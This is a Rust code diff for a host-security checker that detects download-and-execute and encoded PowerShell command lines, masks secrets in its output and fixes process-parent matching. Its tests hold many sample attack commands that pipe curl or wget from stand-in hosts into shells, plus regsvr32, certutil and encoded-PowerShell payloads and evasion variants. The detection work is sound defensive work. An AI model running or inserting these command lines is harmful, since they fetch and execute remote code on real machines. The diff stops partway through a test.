@@ -8,6 +8,8 @@
 use std::collections::{HashMap, HashSet};
 use std::net::IpAddr;
 
+use chrono::NaiveDateTime;
+
 use super::regles::{Os, regle};
 use super::{Constat, alerte, impossible, ok};
 use crate::risk::Niveau;
@@ -112,16 +114,19 @@ fn conseil(systeme: Os, comptes: &str) -> String {
     }
 }
 
-/// Le constat des connexions réussies après une rafale d'échecs, avec le conseil de ce système.
-pub(crate) fn juger_intrusions(intrusions: &[Intrusion], systeme: Os) -> Constat {
+/// Le constat des connexions réussies après une rafale d'échecs, avec le conseil de ce système. `partiel` : ce que la
+/// lecture du journal n'a pas pu voir (une borne atteinte), dit avec le constat sain, qui n'est jamais sans réserve.
+pub(crate) fn juger_intrusions(intrusions: &[Intrusion], systeme: Os, partiel: Option<&str>) -> Constat {
     if intrusions.is_empty() {
-        return ok(
-            "Comptes",
-            trf!(
-                "Aucune connexion réussie depuis une adresse qui venait de rater au moins {SEUIL_ECHECS} fois.",
-                "No successful sign-in from an address that had just failed at least {SEUIL_ECHECS} times."
-            ),
+        let mut texte = trf!(
+            "Aucune connexion réussie depuis une adresse qui venait de rater au moins {SEUIL_ECHECS} fois.",
+            "No successful sign-in from an address that had just failed at least {SEUIL_ECHECS} times."
         );
+        if let Some(p) = partiel {
+            texte.push(' ');
+            texte.push_str(p);
+        }
+        return ok("Comptes", texte);
     }
     let liste: Vec<String> = intrusions
         .iter()
@@ -152,26 +157,36 @@ pub(crate) fn juger_intrusions(intrusions: &[Intrusion], systeme: Os) -> Constat
     alerte("Comptes", Niveau::Critique, texte).manuel(conseil(systeme, &comptes(intrusions)), &["vanguard traces"])
 }
 
+/// Les tentatives lues dans un journal, et ce que la lecture n'a pas pu voir, quand elle a atteint une borne.
+type Lues = (Vec<Tentative>, Option<String>);
+
 /// La vérification : les tentatives lues dans le journal du système, jugées. Rien sans serveur à surveiller ; un
 /// journal qui ne se lit pas le dit (non vérifié, jamais sain).
 fn connexion_forcee() -> Vec<Constat> {
     match tentatives_lues() {
         None => Vec::new(),
         Some(Err(refus)) => vec![refus],
-        Some(Ok(tentatives)) => vec![juger_intrusions(&intrusions(&tentatives), Os::actuel())],
+        Some(Ok((tentatives, partiel))) => vec![juger_intrusions(
+            &intrusions(&tentatives),
+            Os::actuel(),
+            partiel.as_deref(),
+        )],
     }
 }
 
 /// Sous Linux : le journal de sshd des dernières 24 h.
 #[cfg(target_os = "linux")]
-fn tentatives_lues() -> Option<Result<Vec<Tentative>, Constat>> {
-    super::linux::tentatives_ssh_lues()
+fn tentatives_lues() -> Option<Result<Lues, Constat>> {
+    Some(match super::linux::tentatives_ssh_lues()? {
+        Ok(tentatives) => Ok((tentatives, None)),
+        Err(refus) => Err(refus),
+    })
 }
 
 /// Sous Windows : le journal de la sécurité des 7 derniers jours, qui refuse sans droits d'administrateur.
 #[cfg(windows)]
 #[allow(clippy::unnecessary_wraps)] // même signature que sous Linux, où il peut n'y avoir aucun serveur SSH
-fn tentatives_lues() -> Option<Result<Vec<Tentative>, Constat>> {
+fn tentatives_lues() -> Option<Result<Lues, Constat>> {
     Some(super::windows::evenements::tentatives_lues().map_err(|raison| impossible("Comptes", raison)))
 }
 
@@ -179,7 +194,7 @@ fn tentatives_lues() -> Option<Result<Vec<Tentative>, Constat>> {
 /// journée) : non vérifié, jamais compté comme sain.
 #[cfg(target_os = "macos")]
 #[allow(clippy::unnecessary_wraps)] // même signature que sous Linux, où il peut n'y avoir aucun serveur SSH
-fn tentatives_lues() -> Option<Result<Vec<Tentative>, Constat>> {
+fn tentatives_lues() -> Option<Result<Lues, Constat>> {
     Some(Err(impossible(
         "Comptes",
         tr!(
@@ -204,13 +219,20 @@ pub(crate) struct EnMarche {
     pub ligne: Option<String>,
     /// Son programme n'est plus sur le disque : effacé après son lancement.
     pub sans_fichier: bool,
+    /// Sa naissance (UTC), quand le système la donne. Sous Windows, le numéro d'un parent mort peut passer à un
+    /// processus plus jeune, qui n'est pas ce parent ; Linux et macOS rattachent l'orphelin à un autre parent.
+    pub ne: Option<NaiveDateTime>,
 }
 
-/// Un motif trouvé dans une ligne de commande : pourquoi elle est suspecte, et où il finit (en octets). Ce qui suit
-/// n'est jamais montré : une adresse, un jeton ou un mot de passe peuvent y être.
+/// Un motif trouvé dans une ligne de commande : pourquoi elle est suspecte, son texte, et sa place (en octets). Seul
+/// ce texte est montré, avec le programme : ce qui précède (« GITHUB_TOKEN=… », « Authorization='Bearer …' ») comme
+/// ce qui suit (une adresse, un jeton) peut porter un secret.
 #[derive(Debug, PartialEq, Eq)]
 pub(crate) struct Motif {
     pub raison: &'static str,
+    /// Le motif tel qu'il est écrit : « -enc », « IEX », « curl », « base64 -d ».
+    pub mot: String,
+    pub debut: usize,
     pub fin: usize,
 }
 
@@ -233,12 +255,15 @@ fn nom_de_fichier(chemin: &str) -> &str {
     chemin.rsplit(['/', '\\']).next().unwrap_or(chemin)
 }
 
-/// Les mots d'un texte (séparés par des blancs), chacun avec la position, en octets, de sa fin.
+/// Les mots d'un texte, chacun avec la position, en octets, de sa fin. Ils sont séparés par des blancs et par ce qui
+/// sépare ou groupe les commandes du shell (« ( ) ; & | ` { } ») : « (curl -fsSL …||wget …)|sh », la ligne de cron
+/// des mineurs, cachait curl dans « (curl » et wget dans « a.sh||wget ».
 fn mots(texte: &str) -> Vec<(&str, usize)> {
+    let separe = |c: char| c.is_whitespace() || matches!(c, '(' | ')' | ';' | '&' | '|' | '`' | '{' | '}');
     let mut mots = Vec::new();
     let mut debut = None;
     for (i, c) in texte.char_indices().chain(std::iter::once((texte.len(), ' '))) {
-        match (c.is_whitespace(), debut) {
+        match (separe(c), debut) {
             (true, Some(d)) => {
                 mots.push((&texte[d..i], i));
                 debut = None;
@@ -270,39 +295,53 @@ pub(crate) fn detournement(programme: &str, args: &str) -> Option<Motif> {
     // Minuscules ASCII seulement : chaque position trouvée vaut dans `args`.
     let bas = args.to_ascii_lowercase();
     let mots = mots(&bas);
-    // La fin du premier mot qui répond, « /x » lu comme « -x » (Windows accepte les deux).
-    let option = |test: &dyn Fn(&str) -> bool| {
+    // Le premier mot qui répond, et sa place : « /x » lu comme « -x » (Windows accepte les deux), comme chaque autre
+    // tiret de `tirets`.
+    let option = |tirets: &[char], test: &dyn Fn(&str) -> bool| {
         mots.iter()
             .find(|(m, _)| {
                 let m = m.trim_matches('"');
-                match m.strip_prefix('/') {
+                match m.strip_prefix(tirets) {
                     Some(reste) => test(&format!("-{reste}")),
                     None => test(m),
                 }
             })
-            .map(|&(_, fin)| fin)
+            .map(|&(m, fin)| (fin - m.len(), fin))
     };
-    let premier = |motifs: &[&str]| motifs.iter().filter_map(|m| bas.find(m).map(|i| i + m.len())).min();
-    let motif = |raison: &'static str| move |fin: usize| Motif { raison, fin };
+    let premier = |motifs: &[&str]| {
+        motifs
+            .iter()
+            .filter_map(|m| bas.find(m).map(|i| (i, i + m.len())))
+            .min_by_key(|&(_, fin)| fin)
+    };
+    let mot_entier = |m: &str| fin_du_mot(&bas, m).map(|fin| (fin - m.len(), fin));
+    // Le motif à sa place, tel qu'il est écrit dans `args`, sans guillemets autour.
+    let motif = |raison: &'static str| {
+        move |(debut, fin): (usize, usize)| Motif {
+            raison,
+            mot: args[debut..fin].trim_matches(['"', '\'']).to_string(),
+            debut,
+            fin,
+        }
+    };
     match programme {
         "powershell" | "pwsh" => {
-            let cachee = option(&|m: &str| {
+            // PowerShell lit aussi les tirets longs (–, —, ―) comme « - » : « –enc » cache autant que « -enc ».
+            let tirets = ['/', '\u{2013}', '\u{2014}', '\u{2015}'];
+            let cachee = option(&tirets, &|m: &str| {
                 m == "-e" || m == "-ec" || (m.starts_with("-en") && "-encodedcommand".starts_with(m))
             });
-            if let Some(fin) = cachee {
-                return Some(Motif {
-                    raison: tr!(
-                        "commande PowerShell cachée en base64",
-                        "PowerShell command hidden in base64"
-                    ),
-                    fin,
-                });
+            if let Some(place) = cachee {
+                return Some(motif(tr!(
+                    "commande PowerShell cachée en base64",
+                    "PowerShell command hidden in base64"
+                ))(place));
             }
             let execute = ["iex", "invoke-expression"]
-                .iter()
-                .filter_map(|m| fin_du_mot(&bas, m))
-                .min();
-            let telecharge = fin_du_mot(&bas, "downloadstring");
+                .into_iter()
+                .filter_map(mot_entier)
+                .min_by_key(|&(_, fin)| fin);
+            let telecharge = mot_entier("downloadstring");
             let raison = match (execute, telecharge) {
                 (Some(_), Some(_)) => tr!(
                     "télécharge un script et l'exécute aussitôt",
@@ -318,7 +357,11 @@ pub(crate) fn detournement(programme: &str, args: &str) -> Option<Motif> {
                 ),
                 (None, None) => return None,
             };
-            execute.into_iter().chain(telecharge).min().map(motif(raison))
+            execute
+                .into_iter()
+                .chain(telecharge)
+                .min_by_key(|&(_, fin)| fin)
+                .map(motif(raison))
         }
         "mshta" => premier(&["http:", "https:", "javascript:", "vbscript:"]).map(motif(tr!(
             "mshta lance un script venu d'Internet",
@@ -331,11 +374,11 @@ pub(crate) fn detournement(programme: &str, args: &str) -> Option<Motif> {
         "rundll32" => {
             premier(&["javascript:"]).map(motif(tr!("rundll32 exécute du JavaScript", "rundll32 runs JavaScript")))
         }
-        "certutil" => option(&|m: &str| m == "-urlcache" || m == "-decode").map(motif(tr!(
+        "certutil" => option(&['/'], &|m: &str| m == "-urlcache" || m == "-decode").map(motif(tr!(
             "certutil détourné pour télécharger ou décoder un fichier",
             "certutil misused to download or decode a file"
         ))),
-        "bitsadmin" => option(&|m: &str| m == "-transfer").map(motif(tr!(
+        "bitsadmin" => option(&['/'], &|m: &str| m == "-transfer").map(motif(tr!(
             "bitsadmin détourné pour télécharger un fichier",
             "bitsadmin misused to download a file"
         ))),
@@ -360,43 +403,77 @@ fn morceaux_du_tube(ligne: &str) -> Vec<(usize, &str)> {
     morceaux
 }
 
+/// Les programmes qui en lancent un autre : passés, avec leurs options, pour trouver le vrai interpréteur d'un morceau
+/// de tube (« | sudo -u root sh », « | env -i sh », « | busybox sh », « | exec bash »).
+const RELAIS: [&str; 5] = ["sudo", "doas", "env", "busybox", "exec"];
+
+/// « NOM=valeur » : une variable donnée au programme qui suit, pas un programme.
+fn affectation(mot: &str) -> bool {
+    mot.split_once('=').is_some_and(|(nom, _)| {
+        nom.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
+            && nom.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+    })
+}
+
+/// Le programme qui reçoit un morceau de tube : les relais, leurs options (et la valeur de -u ou -g, un compte ou un
+/// groupe, pas un programme) et les variables passés.
+fn programme_du_morceau(morceau: &str) -> Option<&str> {
+    let mut valeur_d_option = false;
+    for (m, _) in mots(morceau) {
+        if std::mem::take(&mut valeur_d_option) || RELAIS.contains(&nom_de_fichier(m)) || affectation(m) {
+            continue;
+        }
+        if m.starts_with('-') {
+            valeur_d_option = matches!(m, "-u" | "-g" | "--user" | "--group");
+            continue;
+        }
+        return Some(m);
+    }
+    None
+}
+
 /// Un script téléchargé (curl, wget) ou décodé (base64 -d) passé aussitôt à un interpréteur par un tube : ce qui
-/// s'exécute ne touche jamais le disque. La fin du motif est celle du mot curl ou wget, ou de l'option de base64 :
-/// l'adresse qui suit, qui peut porter un jeton, n'est pas montrée.
+/// s'exécute ne touche jamais le disque. Le motif est le mot curl ou wget, ou base64 et son option : l'adresse qui
+/// suit, qui peut porter un jeton, n'est pas montrée.
 pub(crate) fn passe_a_un_shell(ligne: &str) -> Option<Motif> {
     const INTERPRETES: [&str; 8] = ["sh", "bash", "zsh", "dash", "ksh", "python", "python3", "perl"];
     let bas = ligne.to_ascii_lowercase();
     let morceaux = morceaux_du_tube(&bas);
-    // Le programme qui reçoit un morceau, sudo et ses options passés.
-    let interprete = |morceau: &str| {
-        morceau
-            .split_whitespace()
-            .find(|m| *m != "sudo" && !m.starts_with('-'))
-            .is_some_and(|p| INTERPRETES.contains(&nom_de_fichier(p)))
-    };
+    let interprete =
+        |morceau: &str| programme_du_morceau(morceau).is_some_and(|p| INTERPRETES.contains(&nom_de_fichier(p)));
     for (k, (debut, morceau)) in morceaux.iter().enumerate() {
         if !morceaux[k + 1..].iter().any(|(_, suite)| interprete(suite)) {
             continue;
         }
-        let mots = mots(morceau);
-        if let Some(&(_, fin)) = mots.iter().find(|(m, _)| ["curl", "wget"].contains(&nom_de_fichier(m))) {
+        // Chaque mot du morceau, à sa place dans la ligne : lu en minuscules, montré tel qu'il est écrit.
+        let places: Vec<(usize, usize)> = mots(morceau)
+            .into_iter()
+            .map(|(m, fin)| (debut + fin - m.len(), debut + fin))
+            .collect();
+        let nom = |&(a, b): &(usize, usize)| nom_de_fichier(&bas[a..b]);
+        let ecrit = |(a, b): (usize, usize)| nom_de_fichier(&ligne[a..b]).to_string();
+        if let Some(&place) = places.iter().find(|p| ["curl", "wget"].contains(&nom(p))) {
             return Some(Motif {
                 raison: tr!(
                     "télécharge un script et l'exécute aussitôt",
                     "downloads a script and runs it right away"
                 ),
-                fin: debut + fin,
+                mot: ecrit(place),
+                debut: place.0,
+                fin: place.1,
             });
         }
-        if let Some(i) = mots.iter().position(|(m, _)| nom_de_fichier(m) == "base64")
-            && let Some(&(_, fin)) = mots[i + 1..].iter().find(|(m, _)| matches!(*m, "-d" | "--decode"))
+        if let Some(i) = places.iter().position(|p| nom(p) == "base64")
+            && let Some(&option) = places[i + 1..].iter().find(|p| matches!(nom(p), "-d" | "--decode"))
         {
             return Some(Motif {
                 raison: tr!(
                     "commande cachée en base64, exécutée aussitôt",
                     "command hidden in base64, run right away"
                 ),
-                fin: debut + fin,
+                mot: format!("{} {}", ecrit(places[i]), ecrit(option)),
+                debut: places[i].0,
+                fin: option.1,
             });
         }
     }
@@ -421,7 +498,26 @@ fn extrait(texte: &str, suite: bool) -> String {
     montre
 }
 
-/// Une ligne de commande qui télécharge ou cache ce qu'elle exécute : sa raison, et son début jusqu'au motif.
+/// Ce qui est montré d'une ligne de commande suspecte : son programme et le motif, rien d'autre. Ce qui les sépare
+/// devient « … » : une variable ou un en-tête écrit avant le motif peut porter un secret. `programme` : son nom, et où
+/// il finit dans `texte` (`None`, ou au-delà du début du motif : le motif seul). `texte` contient le motif à sa place.
+fn montrer_le_motif(programme: Option<(&str, usize)>, texte: &str, m: &Motif) -> String {
+    let montre = match programme {
+        Some((nom, fin)) if fin <= m.debut => {
+            let entre = texte
+                .get(fin..m.debut)
+                .unwrap_or("")
+                .trim_matches(|c: char| c.is_whitespace() || c == '"' || c == '\'');
+            let entre = if entre.is_empty() { "" } else { "… " };
+            format!("{nom} {entre}{}", m.mot)
+        }
+        _ => m.mot.clone(),
+    };
+    extrait(&montre, m.fin < texte.trim_end().len())
+}
+
+/// Une ligne de commande qui télécharge ou cache ce qu'elle exécute : sa raison, et ce qu'on en montre (son programme
+/// et le motif).
 pub(crate) fn commande_suspecte(ligne: &str) -> Option<(&'static str, String)> {
     // Le programme se lit de deux façons : un chemin à espaces sans guillemets (« C:\Program Files\…\x.exe -a »)
     // demande `decouper_commande`, qui coupe au premier « .exe » ; mais « certutil -decode a.txt a.exe », tapé sans
@@ -436,13 +532,16 @@ pub(crate) fn commande_suspecte(ligne: &str) -> Option<(&'static str, String)> {
         let programme = fichier.to_ascii_lowercase();
         let programme = programme.strip_suffix(".exe").unwrap_or(&programme);
         if let Some(m) = detournement(programme, &args) {
-            let debut = args.get(..m.fin).unwrap_or(&args);
-            return Some((m.raison, extrait(&format!("{fichier} {debut}"), m.fin < args.len())));
+            return Some((m.raison, montrer_le_motif(Some((fichier, 0)), &args, &m)));
         }
     }
     let m = passe_a_un_shell(ligne)?;
-    let debut = ligne.get(..m.fin).unwrap_or(ligne);
-    Some((m.raison, extrait(debut, m.fin < ligne.trim_end().len())))
+    // Le programme de la ligne, montré s'il est un seul mot qui n'est pas une variable (« GITHUB_TOKEN=… curl »).
+    let (exe, args) = crate::commande::decouper_commande(ligne);
+    let fichier = nom_de_fichier(&exe);
+    let programme = (!fichier.contains(char::is_whitespace) && !fichier.contains('='))
+        .then_some((fichier, ligne.len().saturating_sub(args.len())));
+    Some((m.raison, montrer_le_motif(programme, ligne, &m)))
 }
 
 /// Un outil offensif connu, reconnu au nom de son fichier : voleurs de mots de passe, outils d'attaque d'Active
@@ -604,7 +703,10 @@ pub(crate) fn juger_programme(p: &EnMarche, systeme: Os) -> Option<Soupcon> {
 }
 
 /// Les processus de Vanguard lui-même, jamais montrés : celui-ci, ceux du même programme (une autre fenêtre, la copie
-/// élevée en administrateur), et tout ce qu'ils ont lancé (PowerShell, journalctl, ps pendant le bilan).
+/// élevée en administrateur), et tout ce qu'ils ont lancé (PowerShell, journalctl, ps pendant le bilan). Un parent né
+/// après son enfant n'est pas son parent : sous Windows, le numéro d'un parent mort (celui de l'explorateur, par
+/// exemple) peut avoir été repris par Vanguard, qui aurait sinon écarté l'explorateur et tout ce qu'il a lancé. Sans
+/// les deux dates, le lien est gardé.
 pub(crate) fn de_vanguard(liste: &[EnMarche], moi: u32, mon_programme: Option<&str>) -> HashSet<u32> {
     let meme_programme = |c: &str| {
         mon_programme.is_some_and(|m| {
@@ -621,7 +723,17 @@ pub(crate) fn de_vanguard(liste: &[EnMarche], moi: u32, mon_programme: Option<&s
         .map(|p| p.pid)
         .collect();
     racines.push(moi);
-    let paires: Vec<(u32, u32)> = liste.iter().filter_map(|p| Some((p.pid, p.parent?))).collect();
+    let nes: HashMap<u32, NaiveDateTime> = liste.iter().filter_map(|p| Some((p.pid, p.ne?))).collect();
+    let paires: Vec<(u32, u32)> = liste
+        .iter()
+        .filter_map(|p| {
+            let parent = p.parent?;
+            let numero_repris =
+                p.ne.zip(nes.get(&parent))
+                    .is_some_and(|(enfant, parent)| *parent > enfant);
+            (!numero_repris).then_some((p.pid, parent))
+        })
+        .collect();
     let mut ecartes: HashSet<u32> = racines.iter().copied().collect();
     for racine in racines {
         ecartes.extend(crate::commande::descendants(&paires, racine));
@@ -798,6 +910,7 @@ fn programmes_en_marche() -> Option<(Vec<EnMarche>, Option<&'static str>)> {
                 chemin,
                 ligne,
                 sans_fichier,
+                ne: None,
             })
         })
         .collect();
@@ -819,7 +932,14 @@ fn programmes_en_marche() -> Option<(Vec<EnMarche>, Option<&'static str>)> {
         r"root\cimv2",
         "Win32_Process",
         "",
-        &["ProcessId", "ParentProcessId", "Name", "ExecutablePath", "CommandLine"],
+        &[
+            "ProcessId",
+            "ParentProcessId",
+            "Name",
+            "ExecutablePath",
+            "CommandLine",
+            "CreationDate",
+        ],
     );
     let mut liste: Vec<EnMarche> = match par_wmi {
         Some(lignes) if !lignes.is_empty() => lignes
@@ -833,6 +953,7 @@ fn programmes_en_marche() -> Option<(Vec<EnMarche>, Option<&'static str>)> {
                     chemin: texte("ExecutablePath"),
                     ligne: texte("CommandLine"),
                     sans_fichier: false,
+                    ne: p["CreationDate"].texte().and_then(date_cim),
                 })
             })
             .collect(),
@@ -880,10 +1001,20 @@ fn programmes_en_marche() -> Option<(Vec<EnMarche>, Option<&'static str>)> {
                 sans_fichier: chemin.as_deref().is_some_and(|c| !std::path::Path::new(c).exists()),
                 chemin,
                 ligne: lignes.get(&pid).cloned(),
+                ne: None,
             }
         })
         .collect();
     Some((liste, None))
+}
+
+/// Une date CIM de WMI (« 20261021063000.123456-240 », décalage en minutes) en UTC, à la microseconde : un parent et
+/// son enfant nés dans la même seconde restent dans l'ordre.
+#[cfg(any(windows, test))]
+fn date_cim(texte: &str) -> Option<NaiveDateTime> {
+    let locale = NaiveDateTime::parse_from_str(texte.get(..21)?, "%Y%m%d%H%M%S%.f").ok()?;
+    let decalage: i64 = texte.get(21..)?.parse().ok()?;
+    Some(locale - chrono::TimeDelta::minutes(decalage))
 }
 
 #[cfg(test)]
@@ -960,13 +1091,13 @@ mod tests {
 
     #[test]
     fn constat_d_intrusion() {
-        assert!(juger_intrusions(&[], Os::Linux).probleme.is_none());
+        assert!(juger_intrusions(&[], Os::Linux, None).probleme.is_none());
         let internet = Intrusion {
             adresse: ip("203.0.113.7"),
             compte: "alice".into(),
             echecs: 42,
         };
-        let c = juger_intrusions(std::slice::from_ref(&internet), Os::Linux);
+        let c = juger_intrusions(std::slice::from_ref(&internet), Os::Linux, None);
         assert_eq!(c.probleme, Some(Niveau::Critique));
         assert!(c.verifie);
         assert!(
@@ -983,7 +1114,7 @@ mod tests {
             compte: "alice".into(),
             echecs: 12,
         };
-        let c = juger_intrusions(&[locale], Os::Windows);
+        let c = juger_intrusions(&[locale], Os::Windows, None);
         assert_eq!(c.probleme, Some(Niveau::Critique));
         assert!(
             c.message.contains(tr!("réseau local", "local network")),
@@ -1002,8 +1133,21 @@ mod tests {
             compte: "x\x1b]52;c;eA==\x07".into(),
             echecs: 10,
         };
-        let c = juger_intrusions(&[piege], Os::Linux);
+        let c = juger_intrusions(&[piege], Os::Linux, None);
         assert!(!c.message.contains('\x1b') && !c.correctif.unwrap().action.contains('\x1b'));
+    }
+
+    /// Une lecture qui a atteint sa borne (les 2 000 échecs les plus récents sous Windows) : sain, jamais sans le dire.
+    #[test]
+    fn lecture_partielle_dite() {
+        let c = juger_intrusions(&[], Os::Windows, Some("Lecture partielle : x."));
+        assert!(c.verifie && c.probleme.is_none());
+        assert!(c.message.ends_with("Lecture partielle : x."), "{}", c.message);
+        assert!(
+            !juger_intrusions(&[], Os::Windows, None)
+                .message
+                .contains("Lecture partielle")
+        );
     }
 
     fn suspect(ligne: &str) -> Option<String> {
@@ -1017,14 +1161,14 @@ mod tests {
         // PowerShell : commande cachée, texte exécuté, script téléchargé. Ce qui suit le motif n'est pas montré.
         let e =
             suspect(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -enc SQBFAFgA").unwrap();
-        assert_eq!(e, "powershell.exe -nop -w hidden -enc…");
+        assert_eq!(e, "powershell.exe … -enc…");
         assert!(suspect("powershell -EncodedCommand SQBFAFgA").is_some());
         assert!(suspect("pwsh.exe /ec SQBFAFgA").is_some());
         let e = suspect(
             r#"powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1?jeton=s3cret')""#,
         )
         .unwrap();
-        assert_eq!(e, "powershell -c \"IEX…");
+        assert_eq!(e, "powershell … IEX…");
         let e =
             suspect("powershell -c (New-Object Net.WebClient).DownloadString('http://x.example/?k=s3cret')").unwrap();
         assert!(e.ends_with("DownloadString…") && !e.contains("s3cret"), "{e}");
@@ -1038,13 +1182,13 @@ mod tests {
         assert!(suspect("certutil -decode a.txt a.exe").is_some());
         assert_eq!(
             suspect("regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll").unwrap(),
-            "regsvr32 /s /n /u /i:http…"
+            "regsvr32 … /i:http…"
         );
         assert!(suspect(r#"rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ""#).is_some());
         assert!(suspect("bitsadmin /transfer job http://x.example/a.exe C:\\a.exe").is_some());
         // Linux et macOS : un script téléchargé ou décodé passé à un shell.
         let e = suspect("sh -c curl -fsSL https://x.example/i.sh?jeton=s3cret | sh").unwrap();
-        assert_eq!(e, "sh -c curl…");
+        assert_eq!(e, "sh … curl…");
         assert!(suspect("bash -c wget -qO- http://x.example/a | /bin/bash").is_some());
         assert!(suspect("sh -c curl -s http://x.example/a | sudo -E bash").is_some());
         assert!(
@@ -1064,9 +1208,123 @@ mod tests {
             "sh -c curl -s https://x.example || bash secours.sh",
             "base64 -d sauvegarde.b64",
             "/usr/bin/bash",
+            "curl -fsS https://x.example/a.json | sudo -u alice jq .",
+            "curl -s https://x.example/a.txt | env LANG=C grep -c sh",
+            "powershell -NoProfile -Command Get-Date",
         ] {
             assert_eq!(suspect(ligne), None, "{ligne}");
         }
+    }
+
+    /// La ligne de cron des mineurs (TeamTNT, Kinsing) : le téléchargeur entre parenthèses, curl ou à défaut wget,
+    /// passé à sh. Les parenthèses, « || » et « $( » ne cachent plus curl ni wget.
+    #[test]
+    fn telechargeur_entre_parentheses() {
+        let cron = "(curl -fsSL http://192.0.2.7/a.sh||wget -q -O- http://192.0.2.7/a.sh)|sh";
+        let m = passe_a_un_shell(cron).unwrap();
+        assert_eq!((m.mot.as_str(), &cron[m.debut..m.fin]), ("curl", "curl"));
+        assert_eq!(suspect(cron).as_deref(), Some("curl…"));
+        assert_eq!(suspect(&format!("sh -c {cron}")).as_deref(), Some("sh … curl…"));
+        for ligne in [
+            "(curl -fsSL http://192.0.2.7/a.sh)|bash",
+            "$(curl -fsSL http://192.0.2.7/a.sh)|sh",
+            "(wget -q -O- http://192.0.2.7/a.sh)|sh",
+            "cd /tmp;wget -q -O- http://192.0.2.7/a.sh|sh",
+            "{ curl -s http://192.0.2.7/a.sh; }|sh",
+            "`curl -s http://192.0.2.7/a.sh`|sh",
+            "curl -s http://192.0.2.7/a.sh |& sh",
+            "curl -s http://192.0.2.7/a.sh | (bash)",
+        ] {
+            assert!(passe_a_un_shell(ligne).is_some(), "{ligne}");
+        }
+        // « || » reste le « ou » du shell, pas un tube.
+        assert!(passe_a_un_shell("(curl -fsSL http://192.0.2.7/a.sh||bash secours.sh)").is_none());
+    }
+
+    /// Un secret écrit avant le motif (une variable, un en-tête) n'est jamais montré : le programme et le motif seuls.
+    #[test]
+    fn secret_avant_le_motif_jamais_montre() {
+        let lignes = [
+            "sh -c GITHUB_TOKEN=ghp_x curl -fsSL https://x.example/i.sh | sh",
+            "GITHUB_TOKEN=ghp_x curl -fsSL https://x.example/i.sh | sh",
+            "bash -c Authorization='Bearer sk-x' wget -qO- http://192.0.2.7/a | bash",
+            "sh -c X=sk-x; echo aGk= | base64 -d | sh",
+            r#"powershell -c "$h=@{Authorization='Bearer sk-x'}; IEX (iwr https://x.example/a.ps1 -Headers $h)""#,
+            r#"powershell -c "$t='ghp_x';(New-Object Net.WebClient).DownloadString('http://x.example/a')""#,
+            "pwsh -w hidden -c $env:T='sk-x'; -enc SQBFAFgA",
+            "certutil.exe -user ghp_x -urlcache -f http://192.0.2.7/a.exe a.exe",
+            "mshta.exe --cle=sk-x https://x.example/a.hta",
+        ];
+        let attendus = [
+            "sh … curl…",
+            "curl…",
+            "bash … wget…",
+            "sh … base64 -d…",
+            "powershell … IEX…",
+            "powershell … DownloadString…",
+            "pwsh … -enc…",
+            "certutil.exe … -urlcache…",
+            "mshta.exe … https:…",
+        ];
+        for (ligne, attendu) in lignes.iter().zip(attendus) {
+            let e = suspect(ligne).unwrap_or_else(|| panic!("{ligne}"));
+            assert_eq!(e, attendu, "{ligne}");
+            // Le constat entier non plus.
+            let c = juger_programmes(
+                &[programme(4242, "sh", None, Some(ligne))],
+                Os::Linux,
+                &HashSet::new(),
+                None,
+            );
+            assert!(c.len() == 1 && c[0].probleme == Some(Niveau::Eleve), "{ligne}");
+            assert!(c[0].message.contains(attendu), "{}", c[0].message);
+            assert!(
+                !c[0].message.contains("ghp_") && !c[0].message.contains("sk-"),
+                "{}",
+                c[0].message
+            );
+        }
+    }
+
+    /// Les détours pour cacher l'interpréteur ou l'option : tirets longs de PowerShell, sudo -u, doas, env, busybox,
+    /// exec et les variables devant le shell.
+    #[test]
+    fn contournements() {
+        for tiret in ['\u{2013}', '\u{2014}', '\u{2015}'] {
+            let ligne = format!("powershell.exe -nop {tiret}enc SQBFAFgA");
+            assert_eq!(
+                suspect(&ligne).as_deref(),
+                Some(format!("powershell.exe … {tiret}enc…").as_str()),
+                "{ligne}"
+            );
+            assert!(suspect(&format!("pwsh {tiret}EncodedCommand SQBFAFgA")).is_some());
+        }
+        // Un tiret long n'est pas une option de certutil.
+        assert!(suspect("certutil \u{2013}urlcache -f http://192.0.2.7/a a").is_none());
+        for tube in [
+            "sudo -u root sh",
+            "sudo -uroot -E bash",
+            "sudo --user root sh",
+            "sudo -g wheel -- sh",
+            "doas -u root sh",
+            "env -i PATH=/bin sh",
+            "env -u HISTFILE bash",
+            "busybox sh",
+            "/bin/busybox sh -s",
+            "exec bash",
+            "HISTFILE=/dev/null bash",
+            "sudo env X=1 /usr/bin/python3",
+        ] {
+            let ligne = format!("curl -s http://192.0.2.7/a.sh | {tube}");
+            assert!(passe_a_un_shell(&ligne).is_some(), "{ligne}");
+        }
+        // Le programme reçu est lu au bout des relais : jq et grep ne sont pas des interpréteurs.
+        for tube in ["sudo -u sh jq .", "env SH=1 grep x", "busybox wc -l"] {
+            let ligne = format!("curl -s http://192.0.2.7/a.sh | {tube}");
+            assert!(passe_a_un_shell(&ligne).is_none(), "{ligne}");
+        }
+        assert_eq!(programme_du_morceau(" sudo -u root -g wheel sh -c x"), Some("sh"));
+        assert!(affectation("PATH=/bin") && affectation("_x1=") && !affectation("1A=b") && !affectation("--user=root"));
     }
 
     fn programme(pid: u32, nom: &str, chemin: Option<&str>, ligne: Option<&str>) -> EnMarche {
@@ -1077,6 +1335,7 @@ mod tests {
             chemin: chemin.map(str::to_string),
             ligne: ligne.map(str::to_string),
             sans_fichier: false,
+            ne: None,
         }
     }
 
@@ -1267,6 +1526,74 @@ mod tests {
         assert_eq!(c.len(), 1);
         assert!(c[0].verifie && c[0].probleme.is_none());
         assert!(c[0].message.ends_with("x."), "{}", c[0].message);
+    }
+
+    /// Sous Windows, Vanguard a repris le numéro du parent mort de l'explorateur : l'explorateur, né avant lui, n'est
+    /// pas son enfant, et ce qu'il a lancé reste examiné. Le vrai enfant de Vanguard, né après lui, est écarté. Sans
+    /// dates, le lien est gardé, comme avant.
+    #[test]
+    fn numero_de_parent_repris() {
+        let moi = r"C:\Outils\vanguard.exe";
+        let a = |heure: &str| date_cim(&format!("20261021{heure}.000000-240"));
+        let processus = |pid: u32, parent: u32, nom: &str, ne: &str| EnMarche {
+            pid,
+            parent: Some(parent),
+            nom: nom.into(),
+            ne: a(ne),
+            ..EnMarche::default()
+        };
